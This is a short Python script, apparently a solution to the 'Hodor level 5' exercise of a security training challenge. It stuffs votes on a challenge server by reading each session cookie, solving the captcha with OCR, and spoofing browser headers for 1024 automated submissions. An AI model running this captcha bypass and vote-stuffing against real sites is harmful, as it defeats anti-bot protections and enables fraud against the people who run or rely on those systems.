#!/usr/bin/python3
'''Module for Hodor level 5 challenge'''
import requests
import pytesseract
from PIL import Image
import cv2
obf = __import__('do1').obf


ID = 2224
votes = 1024

success = "Hold the Door challenge - Tim Britton's special"
ok = 0
fail = 0
url = 'http://158.69.76.135/level5.php'
cap_url = 'http://158.69.76.135/tim.php'
data = {'id': ID, 'holdthedoor': 'Submit'}
referer = url
headerwin = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36'
headers = {"User-Agent": headerwin, "Referer": url}

s = requests.Session()
response = s.get(url, headers=headers)


for i in range(votes):
   try:
      response = s.get(url, headers=headers)
      key = response.cookies['HoldTheDoor']
      data["key"] = key
      cookie = {"HoldTheDoor": key}

      response = s.get(cap_url, headers=headers)
      f = open('captcha.png', 'wb')
      f.write(response.content)
      f.close()
      obf("captcha.png")

      img = cv2.imread("o.png")
      readimg = pytesseract.image_to_string(img)
      print("captcha=", readimg)
      data["captcha"] = readimg.split()
      response = s.post(url, headers=headers, data=data)
      if response.status_code is 200 and success in response.text:
         ok += 1
         print("{} ok  ".format(ok), end='\r', flush=True)
   except Exception as e:
      print(e)
      fail += 1
